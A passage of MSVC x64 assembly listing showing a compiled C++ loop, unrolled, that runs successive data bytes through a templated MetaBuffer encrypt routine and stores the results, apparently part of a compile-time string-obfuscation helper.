  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
